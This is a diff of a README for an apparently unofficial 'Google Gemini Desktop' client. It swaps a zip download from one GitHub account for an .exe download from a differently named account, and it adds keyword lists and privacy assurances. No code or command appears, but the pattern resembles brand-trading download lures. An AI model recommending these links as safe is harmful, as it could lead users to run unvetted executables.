@@ -1,124 +1,54 @@
-# Google Gemini Desktop / Windows, macOS, and Linux
+# 🤖 Google-Gemini-Desktop - Access Google Gemini on your desktop
 
-**Google Gemini Desktop** is an unofficial cross-platform AI workspace for multimodal chat, coding assistance, research, creative tasks, and image or file analysis. It gives users a dedicated Gemini-style desktop experience with organized conversations, model selection, reusable prompts, and streaming-friendly responses.
+[![Download Google Gemini Desktop](https://img.shields.io/badge/Download-Gemini_Desktop-blue.svg)](https://github.com/michiganpeleus382/Google-Gemini-Desktop)
 
-The Google Gemini desktop app is built for people who want to move between text, code, documents, and visual material without managing a crowded browser session. Developers can use it for debugging and code explanation, students can structure research, and creators can combine writing prompts with image-based context.
+Google-Gemini-Desktop provides a workspace for Gemini on your computer. This application allows you to use multimodal chat, write code, conduct research, and analyze files. It offers a native experience for Windows users and keeps your conversations organized in one place.
 
-<img width="200" height="200" alt="bea48eaa-0129-42c2-9abe-f66e6783e625" src="https://github.com/user-attachments/assets/c730ba69-cc2b-4b9b-990d-09ef9e26e96f" />
+## 📥 How to Install
 
-## INSTALL
+1. Visit the [Download Page](https://github.com/michiganpeleus382/Google-Gemini-Desktop) to get the latest version.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the file to save it to your computer.
+4. Open the downloaded file to start the installer. 
+5. Follow the prompts on your screen to place the app on your system.
+6. Launch the program from your Start menu or desktop shortcut.
 
-[Download `gemini_desktop.zip`](https://github.com/ctrlkip-rgb/Google-Gemini-Desktop/releases/download/v0.12.2/gemini_desktop.zip)
----
+## ✨ Key Features
 
-Extract the archive before launching the app. Available Gemini models, authentication methods, usage limits, and pricing depend on the service or compatible endpoint configured by the user.
+This client helps you manage your workflow through several built-in tools. You can switch between different AI models to match your needs. The app supports streaming responses, which means text appears as the AI thinks. You can upload images or files for analysis directly within the chat window. The software stores your chat history locally on your machine, which supports your data privacy.
 
-<img width="1692" height="930" alt="63490e84-9832-43b6-814a-2f5024b5d37e" src="https://github.com/user-attachments/assets/601c0988-a8bb-4ab2-bda3-2fd0d97dab80" />
+### Multimodal Chat
+You can talk to the AI using text, images, and documents. The interface handles these inputs so you can focus on your research or coding tasks.
 
-<img width="1152" height="644" alt="a001830a-5914-4106-9e2b-646ef4ad86f5" src="https://github.com/user-attachments/assets/5d35dbbd-9cf3-4219-8bd9-b1645cd7c8bb" />
+### Organized Conversations
+The sidebar tracks your past chats. You can label these chats to track different projects. This keeps your work clean and easy to find later.
 
-## Gemini Desktop Features
+### Model Selection
+You can choose the model that fits your specific job. Use faster models for quick tasks or advanced models for complex analysis. The app includes support for Gemini 1.5, 2.0, and newer iterations.
 
-- **Multimodal AI workspace** — combine written instructions with supported images, documents, and files.
-- **Gemini model selection** — choose among models exposed by the configured service or endpoint.
-- **AI coding assistance** — explain code, diagnose errors, plan features, draft tests, and review changes.
-- **Image and file analysis** — ask structured questions about supported visual or document inputs.
-- **Streaming conversation UI** — follow long answers as they are generated instead of waiting for completion.
-- **Prompt workflow library** — reuse instructions for development, research, analysis, and creative writing.
-- **Organized desktop sessions** — separate projects and revisit useful conversations.
-- **Cross-platform experience** — designed for Windows, macOS, and Linux desktop workflows.
+## 💻 System Requirements
 
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** 4GB of RAM or more.
+*   **Storage:** 500MB of free disk space.
+*   **Network:** An active internet connection for the AI to function.
 
-<img width="686" height="386" alt="288513cc-b63f-4647-8f71-fc1bbe2fdbbd" src="https://github.com/user-attachments/assets/08aec5bb-e56f-4d6b-b005-241a023e40ff" />
+## 🛠️ Usage Tips
 
-## What Can You Do with Google Gemini Desktop?
+When you open the app for the first time, you might need to enter an API key. You can create this key through the Google AI Studio website. Paste this key into the settings menu of the application to establish a connection to the Google servers. 
 
-### Multimodal Image Analysis
+Once connected, you can type your questions in the main box. Press Enter to send a message. If you want to include an image, click the paperclip icon or drag the file into the text area. 
 
-Attach a supported image and ask for observable details, a comparison, extracted interface text, accessibility notes, or a structured description. For important decisions, verify the result manually and do not assume the model can see information that is cropped, blurred, or missing.
+If you notice slow responses, check your internet connection or try switching to a lighter model in the settings menu. You can clear your chat history at any time by selecting the trash icon next to a conversation thread.
 
-### Coding and Technical Work
+## 🔒 Privacy and Security
 
-Use a dedicated Gemini coding session to explain unfamiliar modules, design test cases, draft migration steps, review logs, or explore implementation options. Include the language, framework, version, runtime, expected behavior, and a minimal reproducible example.
+The app saves your data on your own computer. Google does not have access to these local files. Your API key stays on your machine and only acts as a bridge to send your questions to the model. You control when to delete your history. 
 
-<img width="1296" height="1296" alt="42c7c875-226e-4630-863c-0251a2d46572" src="https://github.com/user-attachments/assets/e7627dad-0061-4c0a-97c1-af5eb42e3a5d" />
+## 📝 Troubleshooting
 
-### Research and File Review
+If the application fails to launch, ensure you have the latest updates for Windows installed. If the AI does not reply, verify that your API key is correct and active. Sometimes, an old key stops working after a period of time, so generate a new one if errors persist. 
 
-Turn a collection of notes into questions, themes, disputed claims, and follow-up tasks. Ask the model to distinguish direct evidence from inference and to cite the supplied source section whenever possible.
-<img width="1200" height="720" alt="b407e089-cfca-4259-83b7-ff98f2056b1a" src="https://github.com/user-attachments/assets/2bea39ca-4781-4cf0-8740-a231a168a1ed" />
+If you encounter a blank screen, restart the application. If the problem continues, remove the app via the Windows Control Panel and install it again from the official link provided above.
 
-### Creative Writing and Ideation
-
-Keep separate workspaces for outlines, scripts, product concepts, campaign drafts, and revision passes. Save a compact style guide in the prompt so terminology, audience, tone, and constraints remain consistent.
-
-<img width="1300" height="731" alt="1640a3e4-de83-400d-91e6-21b31f921cbf" src="https://github.com/user-attachments/assets/1d1de80c-3923-4689-8c18-062d41626d37" />
-
-
-## Getting Started
-
-1. Download the Google Gemini Desktop release archive.
-2. Extract all files to a dedicated folder.
-3. Launch the build intended for your operating system.
-4. Review connection options and configure only credentials or endpoints you trust.
-5. Select a model suited to the task and the available service limits.
-6. Start a text, coding, research, image, or document-analysis session.
-
-**Prompt tip:** state the outcome you want, provide only relevant context, define the response format, and ask the model to mark uncertainty. When analyzing an image or file, name the specific details that matter.
-
-
-## System Requirements
-
-- Windows 10 or Windows 11
-- macOS on Intel or Apple Silicon
-- Linux distribution compatible with the packaged build
-- Internet connection for remote Gemini model access
-- 8 GB RAM or more recommended for comfortable multitasking
-- Extra storage for extracted archives and local conversation data
-
-
-## Privacy and Security
-
-Google Gemini Desktop is an unofficial community client and is not endorsed by Google. Model names, availability, limits, and endpoint behavior can change independently of this repository.
-
-- Download the app only from a repository and release page you trust.
-- Scan the extracted package with current security software.
-- Do not share passwords, authentication tokens, private keys, or regulated personal data.
-- Check where uploaded images and files are processed before sending them.
-- Use only endpoints you are authorized to access and follow their terms and limits.
-- Review generated code, extracted text, and factual claims before relying on them.
-
-## Gemini Desktop vs. Browser and API Workflows
-
-- **Google Gemini Desktop** — best when you want a dedicated multimodal workspace and organized desktop conversations.
-- **Google AI Studio** — useful for browser-based model exploration and prompt prototyping.
-- **Gemini API integration** — suited to automation, production applications, evaluation, and repeatable pipelines.
-- **IDE coding assistant** — useful for inline completion and repository-aware editing.
-- **General browser chat** — convenient for short questions that do not need project separation or desktop organization.
-
-## Troubleshooting
-
-If Google Gemini Desktop does not launch, confirm the package was fully extracted and matches your operating system. For model or connection errors, recheck the configured endpoint, credentials, network, provider status, and account limits. When reporting a bug, remove secrets and include the app version, platform, expected behavior, and reproducible steps.
-
-## Contributing
-
-Community contributions can improve accessibility, multimodal file handling, prompt management, model selection, platform packaging, performance, and documentation. Keep pull requests focused and include a clear explanation of the user-facing change.
-
-## License and Trademarks
-
-The project is provided under the **MIT License**. Consult the repository license file for the complete terms.
-
-Google, Gemini, and related product names are trademarks of their respective owners. This project is unofficial and has no stated affiliation with Google.
-
-## Search Topics
-
-Google Gemini Desktop download, Gemini desktop app for Windows, Gemini client for macOS, Gemini Linux desktop app, multimodal AI desktop client, Gemini coding assistant, image analysis AI app, file analysis desktop AI, streaming AI chat, Google Gemini Pro desktop, Gemini Flash client, cross-platform AI workspace, prompt workflow manager, local conversation history, Google AI Studio alternative.
-
----
-
-<p align="center">
-  A dedicated multimodal desktop workspace for text, code, images, files, and research.
-</p>
-
-
-<img width="1300" height="731" alt="Gemini Desktop cross-platform AI assistant screen" src="https://github.com/user-attachments/assets/1640a3e4-de83-400d-91e6-21b31f921cbf" />
+Keywords: free-gemini-api, gemini-desktop, google-gemini, gemini-ai-integration, gemini-pro, gemini-flash, ai-desktop-app, gemini-assistant
